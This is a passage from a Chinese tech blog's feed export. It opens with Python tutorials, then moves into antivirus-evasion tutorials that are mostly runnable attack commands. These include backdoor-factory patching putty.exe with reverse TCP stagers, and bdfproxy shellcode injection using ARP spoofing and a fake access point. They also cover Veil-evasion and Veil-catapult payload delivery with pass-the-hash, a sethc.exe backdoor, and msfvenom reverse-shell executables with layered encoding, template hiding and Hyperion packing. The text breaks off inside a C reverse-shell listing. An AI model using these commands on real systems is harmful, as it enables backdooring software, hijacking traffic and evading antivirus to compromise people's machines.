class="line"><span class="meta">&gt;&gt;&gt; </span>my_info.name  <span class="comment"># 验证可以取得到变量</span></span><br><span class="line"><span class="string">'wangbm'</span></span><br></pre></td></tr></table></figure><p>好了，8 种方法都给大家介绍完毕，对于普通开发者来说，其实只要掌握 import 这种方法足够了，而对于那些想要自己开发框架的人来说，深入学习 <strong>import</strong> 以及 importlib 是非常有必要的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天跟大家分享 8 种导入模块的方法。&lt;/p&gt;
&lt;p&gt;直接 import&lt;br&gt;人尽皆知的方法，直接导入即可&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
    
      <category term="python" scheme="http://c.cat.plus/categories/python/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="import" scheme="http://c.cat.plus/tags/import/"/>
    
  </entry>
  
  <entry>
    <title>Python内建的数值型函数及基本输入输出</title>
    <link href="http://c.cat.plus/2018/02/08/Python/Python_Basic/Python%E5%86%85%E5%BB%BA%E7%9A%84%E6%95%B0%E5%80%BC%E5%9E%8B%E5%87%BD%E6%95%B0%E5%8F%8A%E5%9F%BA%E6%9C%AC%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/"/>
    <id>http://c.cat.plus/2018/02/08/Python/Python_Basic/Python%E5%86%85%E5%BB%BA%E7%9A%84%E6%95%B0%E5%80%BC%E5%9E%8B%E5%87%BD%E6%95%B0%E5%8F%8A%E5%9F%BA%E6%9C%AC%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA/</id>
    <published>2018-02-08T11:03:05.000Z</published>
    <updated>2020-06-24T09:57:16.275Z</updated>
    
    <content type="html"><![CDATA[<p><strong>预置(内建)的数值型函数</strong></p><pre><code>abs(x)        #取x的绝对值round(number,ndigits)        #对数值进行四舍五入,ndigits是小数向右取整数的位数,负数表示向左取整round(112.34567,3)pow(x,y,z=None)        #相当于 x**y 或 x**y%zhelp()        #查看函数的帮助help(函数名)例:    help(abs)    #查看abs函数的帮助文档</code></pre><p><strong>语句(statements)</strong></p><ul><li>语句是python执行的最小单位,语句可以独立执行</li></ul><p>语句实例:</p><pre><code>a=100    #赋值语句del a     #del语句print(&quot;hello&quot;)    #表达式语句1+2+3            #表达式语句</code></pre><p>说明:</p><ul><li>多条语句写在一行内需要用分号(；)分开</li><li>通常一条语句写在一行内(复合语句除外)</li></ul><p><strong>折行符 \ (反斜杠)</strong></p><ul><li>折行符是告诉解释执行器,下一行的内容也是此语句的内容</li></ul><p><strong>隐式换行</strong></p><ul><li>所有的括号的内容换行时,解释执行器会自动去下一行找到相对应的括号,直到找到为止,称为隐式换行</li></ul><p><strong>基本输入输出函数</strong></p><p>输入函数: <code>input()</code><br>作用:从标准输入设备上读取一个字符串(注:末尾的换行字符会被删除)<br>格式: <code>input(&#39;提示字符串&#39;)</code><br>注:返回一个字符串,提示字符串可以为空</p><p>输出函数: <code>print</code><br>作用:将一系列的值以字符的形式输出到标准设备上,默认为终端<br>格式: <code>print(value,...,sep=&#39;&#39;,end=&#39;\n&#39;)</code><br>关键字参数说明:<br>sep: 两个值之间的分隔符,默认为一个字格’’<br>end: 输出完毕后在流末尾自动追加一个字符串,默认为换行符 <code>&#39;\n&#39;</code></p><h4 id="练习"><a href="#练习" class="headerlink" title="练习"></a><strong>练习</strong></h4><ol><li>假设1年只有365天,输入年数,打印这些年有多少个周</li></ol><ul><li>新建 <code>years.py</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s=input(<span class="string">"请输入年数:"</span>)</span><br><span class="line">years=int(s)</span><br><span class="line"></span><br><span class="line">weeks=years * <span class="number">365</span> // <span class="number">7</span></span><br><span class="line">days=years * <span class="number">365</span> % <span class="number">7</span></span><br><span class="line">print(<span class="string">"共有"</span>,weeks,<span class="string">"个周,余"</span>,days,<span class="string">"天."</span>)</span><br></pre></td></tr></table></figure><ol start="2"><li>分三次输入当前的小时,分钟,秒数,在终端打印此时间距离0:0:0过了多少秒?</li></ol><ul><li>新建 <code>seconds.py</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=input(<span class="string">"请输入小时:"</span>)</span><br><span class="line">hours=int(s)</span><br><span class="line">s=input(<span class="string">"请输入分钟:"</span>)</span><br><span class="line">minutes=int(s)</span><br><span class="line"></span><br><span class="line">s=input(<span class="string">"请输入秒:"</span>)</span><br><span class="line">second=int(s)</span><br><span class="line">print(<span class="string">"总秒数:"</span>,hours * <span class="number">3600</span> + minutes * <span class="number">60</span> + second)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;预置(内建)的数值型函数&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;abs(x)        #取x的绝对值
round(number,ndigits)        #对数值进行四舍五入,ndigits是小数向右取整数的位数,负数表示向左取整
ro
      
    
    </summary>
    
    
      <category term="python" scheme="http://c.cat.plus/categories/python/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python语言的优缺点</title>
    <link href="http://c.cat.plus/2018/02/07/Python/python%E8%AF%AD%E8%A8%80%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/"/>
    <id>http://c.cat.plus/2018/02/07/Python/python%E8%AF%AD%E8%A8%80%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/</id>
    <published>2018-02-07T13:01:01.000Z</published>
    <updated>2020-06-24T07:33:14.375Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Python的诞生"><a href="#Python的诞生" class="headerlink" title="Python的诞生"></a><strong>Python的诞生</strong></h4><ul><li>创建人: Guido van Rossum    (荷兰人)</li><li>时间: 1989年圣诞节期间</li></ul><h4 id="计算机语言发展"><a href="#计算机语言发展" class="headerlink" title="计算机语言发展"></a><strong>计算机语言发展</strong></h4><ol><li>二进制机器指令<br> 01 01 10</li><li>汇编语言<br> ADD R0 R1<br> ST    R2</li><li>编译(compile)型语言<br> C / C++ / Go /PASCAL<br> 先翻译成汇编语言,再翻译成二进制指令</li><li>解释执行语言<br> Python / Java / Php / Basic / C#</li></ol><h4 id="Python应用领域"><a href="#Python应用领域" class="headerlink" title="Python应用领域"></a><strong>Python应用领域</strong></h4><ul><li>系统自动化运维</li><li>网络编程(搜索引擎,爬虫,服务器编程等)</li><li>科学计算</li><li>人工智能,机器人</li><li>Web开发</li><li>云计算</li><li>大数据及数据库编程</li><li>教育</li><li>游戏</li></ul><p><strong>Python的优点</strong></p><ul><li>纯面向对象(Java,C++,Python,C#,Swift)</li><li>免费</li><li>可移植</li><li>可混合编程(C/C++/Java/.net)</li><li>简单易学易用</li><li>开发效率高</li><li>应用领域广泛</li><li>开源</li><li>自动化内存管理和引用计数</li></ul><p><strong>Python的缺点</strong></p><ul><li>与C/C++相比,执行速度不够快</li><li>不能封闭源代码</li><li>不能写操作系统内核和驱动程序</li></ul><p><strong>Python的解释执行器类型</strong></p><ul><li>CPython        (C语言开发,官网下载默认)</li><li>Jython        (Java语言开发)</li><li>IronPython    (.net开发)</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Python的诞生&quot;&gt;&lt;a href=&quot;#Python的诞生&quot; class=&quot;headerlink&quot; title=&quot;Python的诞生&quot;&gt;&lt;/a&gt;&lt;strong&gt;Python的诞生&lt;/strong&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;创建人: Guido van Ross
      
    
    </summary>
    
    
      <category term="python" scheme="http://c.cat.plus/categories/python/"/>
    
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Backdoor-factory后门工厂免杀工具及bdfproxy</title>
    <link href="http://c.cat.plus/2016/08/08/Avoid_Killing/Backdoor-factory%E5%90%8E%E9%97%A8%E5%B7%A5%E5%8E%82%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/"/>
    <id>http://c.cat.plus/2016/08/08/Avoid_Killing/Backdoor-factory%E5%90%8E%E9%97%A8%E5%B7%A5%E5%8E%82%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/</id>
    <published>2016-08-08T13:35:16.000Z</published>
    <updated>2020-06-12T09:34:47.123Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="Backdoor-Factory"><a href="#Backdoor-Factory" class="headerlink" title="Backdoor-Factory"></a><strong>Backdoor-Factory</strong></h3></blockquote><p><strong>Patch</strong></p><ul><li>通过替换EXE,DLL,注册表等方法修复系统漏洞或问题的方法</li><li>BdF:向二进制文件中增加或者删除代码内容<br>  某些受保护的二进制程序无法patch<br>  存在一定概率文件会被patch坏掉</li></ul><p><strong>后门工厂</strong></p><ul><li><p>适用于windows PE x32/x64 和 Linux ELF x32/x64 (OSX)</p></li><li><p>支持MSF payload,自定义payload</p></li><li><p>将shellcode代码patch进模板文件,躲避AV检查</p></li><li><p>Python语言编写</p></li></ul><p><strong>MsF使用的patch方法</strong></p><ul><li><p>覆盖程序入口</p><p>  <code>msfvenom -p windows/shell/reverse_tcp...</code></p></li><li><p>创建新的线程执行shellcode并跳回原程序入口</p><p>  <code>msfvenom -p windows/shell/reverse_tcp -k</code><br>  增加代码片段跳转执行后跳回源程序入口</p></li></ul><p><strong>CTP 方法</strong></p><ul><li>增加新的代码段 section, 与MSF的 <code>-k</code> 方法类似</li><li>使用现有的代码裂缝/洞(code cave)存放 shellcode</li></ul><p><strong>代码洞</strong></p><ul><li>二进制文件中超过两个字节的连续 <code>x00</code> 区域(代码片段间区域)</li><li>根据统计判断代码洞是编译器在进行编译时造成的,不同的编译器造成的代码洞的大小不同</li></ul><pre><code>cp `which cat` .lshexeditor cat</code></pre><ul><li>单个代码洞大小不足以存放完整的shellcode<br>多代码洞跳转(非顺序执行)<br>初期免杀率可达100%<br>结合MsF的stager方法</li></ul><p><strong>Patch选项</strong></p><ul><li>附加代码段</li><li>单代码洞注入</li><li>多代码洞注入</li></ul><h4 id="BdF基本使用"><a href="#BdF基本使用" class="headerlink" title="BdF基本使用"></a><strong>BdF基本使用</strong></h4><p><strong>检查二进制文件是否支持代码注入</strong></p><pre><code>backdoor-factory -f putty.exe –S</code></pre><p><strong>显示可用payload</strong></p><pre><code>backdoor-factory -f putty.exe -s showiat_reverse_tcp_stager_threaded</code></pre><p><strong>查看code cave大小</strong></p><pre><code>backdoor-factory -f putty.exe -c -l 100        #查看100字节的cave大小有多少</code></pre><ul><li>IAT—-import address table<br>指针指向WinAPI地址,被称为thunks(形实转换程序),地址预定义    </li></ul><h5 id="免杀效果对比"><a href="#免杀效果对比" class="headerlink" title="免杀效果对比"></a><strong>免杀效果对比</strong></h5><pre><code>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666        #单代码洞注入backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J        #多代码洞注入backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -a -H 192.168.20.8 -P 6666 -a     #新加一个代码片段注入</code></pre><p><strong>与 veil-evasion 集成</strong></p><ul><li>最新版veil默认已经没有backdoor-factory模块.</li></ul><h4 id="BdFproxy"><a href="#BdFproxy" class="headerlink" title="BdFproxy"></a><strong>BdFproxy</strong></h4><p><strong>BdFproxy</strong> (mitmproxy)</p><ul><li>基于流量劫持动态注入shellcode(ARP spoof, DNS spoof, Fake AP)</li></ul><p><strong>步骤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward&#x3D;1#打开路由IP转发功能</span><br><span class="line"></span><br><span class="line">#添加防火墙规则,把访问目标80&#x2F;443端口的流量重定向到8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80&#x2F;443 -j REDIRECT --toports 8080</span><br><span class="line"></span><br><span class="line">vi &#x2F;etc&#x2F;bdfproxy&#x2F;bdfproxy.cfg</span><br><span class="line">proxyMode &#x3D; transparent#默认代理模式regular,修改为transparent透明代理</span><br><span class="line">修改侦听IP地址并启动bdfproxy#&#x2F;16</span><br><span class="line"></span><br><span class="line">arpspoof -i eth0 -t 1.1.1.2 1.1.1.1#执行ARP欺骗一个目标</span><br></pre></td></tr></table></figure><ul><li><p>启动MsF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfdb init#初始化msf数据库</span><br><span class="line">msfconsole -r &#x2F;usr&#x2F;share&#x2F;bdfproxy&#x2F;bdfproxy_msf_rescurce.rc</span><br></pre></td></tr></table></figure></li><li><p>Mana 创建 Fack AP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mana</span><br><span class="line">vi &#x2F;etc&#x2F;mana-toolkit&#x2F;hostapd-mana.conf</span><br><span class="line">#修改无线SSID名称</span><br><span class="line"></span><br><span class="line">.&#x2F;usr&#x2F;share&#x2F;mana-toolkit&#x2F;run-mana&#x2F;start-nat-simple.sh</span><br><span class="line">修改wlan0无线网卡适配器并启动</span><br><span class="line">iptables -t nat -A PREROUTING -i $phy -p tcp --dport 80&#x2F;443 -j REDIRECT --to-port 8080</span><br><span class="line">sysctl -w net.ipv4.ip_forward&#x3D;1</span><br></pre></td></tr></table></figure></li><li><p>BdFproxy 代理注入代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;bdfproxy&#x2F;bdfproxy.cfg</span><br><span class="line">proxyMode &#x3D; transparent</span><br><span class="line">修改侦听IP地址并启动bdfproxy#&#x2F;16</span><br><span class="line"></span><br><span class="line">bdfproxy</span><br></pre></td></tr></table></figure></li><li><p>MsF侦听反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -r &#x2F;usr&#x2F;share&#x2F;bdfproxy&#x2F;bdfproxy_msf_resource.rc</span><br></pre></td></tr></table></figure></li></ul><p><strong>补充内容</strong></p><ul><li>全站HTTPS防注入(微软每个补丁都带马)</li><li>PE文件证书签名可被清除</li><li>PE Header -&gt; Optional Header -&gt; Certificate Table(Address and size)<br>  全部用 0 覆盖<br>  BDF默认清除数字签名</li><li><code>https://live.sysinternals.com</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;Backdoor-Factory&quot;&gt;&lt;a href=&quot;#Backdoor-Factory&quot; class=&quot;headerlink&quot; title=&quot;Backdoor-Factory&quot;&gt;&lt;/a&gt;&lt;strong&gt;Backdoor-Factory&lt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="backdoor-factory" scheme="http://c.cat.plus/tags/backdoor-factory/"/>
    
      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="bdfproxy" scheme="http://c.cat.plus/tags/bdfproxy/"/>
    
      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
    
  </entry>
  
  <entry>
    <title>Veil-catapult注入进程内存执行及shellter免杀</title>
    <link href="http://c.cat.plus/2016/08/06/Avoid_Killing/Veil-catapult%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8C%E5%8F%8Ashellter%E5%85%8D%E6%9D%80/"/>
    <id>http://c.cat.plus/2016/08/06/Avoid_Killing/Veil-catapult%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8C%E5%8F%8Ashellter%E5%85%8D%E6%9D%80/</id>
    <published>2016-08-06T15:15:06.000Z</published>
    <updated>2020-06-11T10:55:13.768Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="Veil-catapult"><a href="#Veil-catapult" class="headerlink" title="Veil-catapult"></a><strong>Veil-catapult</strong></h3></blockquote><ul><li>也属于 Veil-Framework框架的一部分</li></ul><p><strong>Payload的投递</strong></p><ul><li>集成veil-evasion生成免杀payload或自定义payload</li><li>使用 impacket 上传二进制 payload 文件</li><li>使用 <code>passing-the-hash</code> 触发执行 payload</li></ul><p><strong>Payload直接在内存中运行</strong></p><ul><li>payload不写入硬盘，避免文件型病毒查杀</li></ul><p><strong>Powershell Injector</strong></p><ul><li>适用于windows7及以上系统版本</li></ul><pre><code>veil-catapult         #启动veil-catapult#根据提示进行参数设置#先传了个powershell#然后传了个msf的payload#再用shell调用payload#最后反弹shell</code></pre><p><strong>Barebones Python Injector</strong></p><ul><li>适用于powershell injector 失败的情况下使用</li></ul><p><strong>Sethc backdoor</strong></p><ul><li>用 cmd.exe 替换 C:\Windows\System32\sethc.exe</li></ul><p><strong>Execute custom command</strong></p><ul><li>执行自定义命令</li></ul><p><strong>EXE delivery</strong></p><pre><code>/etc/veil/settings.py</code></pre><h4 id="另一种免杀思路"><a href="#另一种免杀思路" class="headerlink" title="另一种免杀思路"></a><strong>另一种免杀思路</strong></h4><p><strong>传统防病毒查杀原理</strong></p><ul><li>查找文件体特殊字符串,匹配则查杀</li><li>找到触发AV查杀的精确字符串,并将其修改</li></ul><ul><li>将执行程序分片成很多小片段</li><li>将包含MZ头的第一个片段与后续片段依次组合后交给AV查杀</li><li>重复以上步骤,最终精确定位</li></ul><p><strong>二进制文件切片工具</strong> </p><p><code>Evade</code> , <code>Dsplit</code></p><p><strong>16进制文件编辑工具</strong></p><p><code>Hexeditor</code>    , <code>ghex</code>    #ghex是图形化界面</p><pre><code>apt-get install ghex        #kali安装ghex</code></pre><h4 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a><strong>shellter</strong></h4><ul><li>代码混淆</li><li>定制的编码方式</li><li>多态编码</li><li>集成部分 MSF payload</li><li>目前只支持32位PE程序</li><li>使用正常的EXE文件作为模板,将payload代码加入到模板内<br>模板程序的功能将失效</li></ul><p><strong>kali安装shellter</strong></p><pre><code>apt-get install shellter    #安装使用shellter                    #按照提示使用</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;Veil-catapult&quot;&gt;&lt;a href=&quot;#Veil-catapult&quot; class=&quot;headerlink&quot; title=&quot;Veil-catapult&quot;&gt;&lt;/a&gt;&lt;strong&gt;Veil-catapult&lt;/strong&gt;&lt;/h3
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
    
      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="passing-the-hash" scheme="http://c.cat.plus/tags/passing-the-hash/"/>
    
      <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
    
      <category term="shellter" scheme="http://c.cat.plus/tags/shellter/"/>
    
      <category term="ghex" scheme="http://c.cat.plus/tags/ghex/"/>
    
  </entry>
  
  <entry>
    <title>Veil-evasion自动生成免杀后门</title>
    <link href="http://c.cat.plus/2016/08/05/Avoid_Killing/Veil-evasion%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E5%85%8D%E6%9D%80%E5%90%8E%E9%97%A8/"/>
    <id>http://c.cat.plus/2016/08/05/Avoid_Killing/Veil-evasion%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E5%85%8D%E6%9D%80%E5%90%8E%E9%97%A8/</id>
    <published>2016-08-05T12:11:02.000Z</published>
    <updated>2020-06-11T11:01:27.424Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="Veil-evasion"><a href="#Veil-evasion" class="headerlink" title="Veil-evasion"></a><strong>Veil-evasion</strong></h3></blockquote><ul><li><p>属于 Veil-Framework框架的一部分</p></li><li><p>由 Python 语言编写</p></li><li><p>用于自动生成免杀 payload</p></li><li><p>集成msf payload,支持自定义payload</p></li><li><p>集成各种注入技术</p></li><li><p>集成各种第三方工具</p><p>   <code>Hypersion</code> , <code>PEScrambler</code> , <code>BackDoor Factory</code></p></li><li><p>集成各种开发打包运行环境</p><p>   Python: pyinstaller / py2exe<br>   C#: mono for .NET<br>   C: mingw32<br>   ruby</p></li></ul><p><strong>kali安装使用Veil-evasion</strong></p><pre><code>apt-get install veil-evasionveil        #首次运行安装环境use 1        #使用 Evasionlist        #列出shellcode编号,最新3.1版本默认41个payloaduse 35        #选择使用35号python注入型shellcodeoptions        #查看payload选项set            #可以使用set对payload进行配置generate    #确认配置后生成payload</code></pre><h4 id="MSF利用payload"><a href="#MSF利用payload" class="headerlink" title="MSF利用payload"></a><strong>MSF利用payload</strong></h4><ul><li>使用Veil-evasion生成payload后会在本地路径 <code>/var/lib/veil/output/handlers</code> 下保存MSF的处理程序</li></ul><p><strong>使用MSF侦听连接</strong></p><pre><code>msfconsole -r cat35_handler.rc        #MSF使用Veil生成的配置文件jobssessions                    #运行木马后,查看连接会话sessions -i 1                #进入会话ID,获取交互shell</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;Veil-evasion&quot;&gt;&lt;a href=&quot;#Veil-evasion&quot; class=&quot;headerlink&quot; title=&quot;Veil-evasion&quot;&gt;&lt;/a&gt;&lt;strong&gt;Veil-evasion&lt;/strong&gt;&lt;/h3&gt;&lt;/b
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="免杀" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%85%8D%E6%9D%80/"/>
    
    
      <category term="免杀" scheme="http://c.cat.plus/tags/%E5%85%8D%E6%9D%80/"/>
    
      <category term="msfvenom" scheme="http://c.cat.plus/tags/msfvenom/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="Veil-Framework" scheme="http://c.cat.plus/tags/Veil-Framework/"/>
    
      <category term="Hyperion" scheme="http://c.cat.plus/tags/Hyperion/"/>
    
      <category term="Veil-evasion" scheme="http://c.cat.plus/tags/Veil-evasion/"/>
    
  </entry>
  
  <entry>
    <title>msfvenom后门生成及Hyperion加密</title>
    <link href="http://c.cat.plus/2016/08/04/Avoid_Killing/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%8F%8AHyperion%E5%8A%A0%E5%AF%86/"/>
    <id>http://c.cat.plus/2016/08/04/Avoid_Killing/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%8F%8AHyperion%E5%8A%A0%E5%AF%86/</id>
    <published>2016-08-04T11:16:32.000Z</published>
    <updated>2020-06-10T09:08:37.452Z</updated>
    
    <content type="html"><![CDATA[<h4 id="生成反弹shell"><a href="#生成反弹shell" class="headerlink" title="生成反弹shell"></a><strong>生成反弹shell</strong></h4><pre><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe</code></pre><p><strong>生成加密编码反弹shell</strong></p><pre><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/ countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/ shikata_ga_nai -i 9 -b &apos;\x00&apos; -f exe -o a.exe</code></pre><ul><li>比较编码前后的检测率</li></ul><p><strong>查看文件md5值</strong></p><pre><code>md5sum *.exe</code></pre><p><strong>可读字符串查看</strong> 比较</p><pre><code>strings a.exestrings b.exe</code></pre><h4 id="利用模板隐藏shell"><a href="#利用模板隐藏shell" class="headerlink" title="利用模板隐藏shell"></a><strong>利用模板隐藏shell</strong></h4><pre><code>msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe#利用模板和加密生成msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; b.exe</code></pre><blockquote><h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a><strong>软件保护</strong></h4></blockquote><ul><li>软件开发商为保护版权,采用的混淆和加密技术避免盗版逆向</li><li>常被恶意软件用于免杀目的</li></ul><p><strong>Hyperion</strong> (32bit PE程序加密器)</p><ul><li>Crypter / Container    # 解密器 / PE Loader</li></ul><pre><code>#克隆github源码git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zipunzip Hyperion-1.2.zip#加上静态库文件进行编译cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe#安装wine32运行环境dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32#生成后门msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.15 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o a.exe#使用Hyperion后门加壳wine h.exe a.exe b.exe</code></pre><p><strong>Windows reverse shell</strong></p><pre><code>wine gcc.exe windows.c -o windows.exe -lws2_32</code></pre><p><strong>Linux shell</strong></p><pre><code>gcc linux_revers_shell.c -o linux</code></pre><p><strong>linux_revers_shell.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sock</span>;</span></span><br><span class="line"><span class="keyword">int</span> s;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>); <span 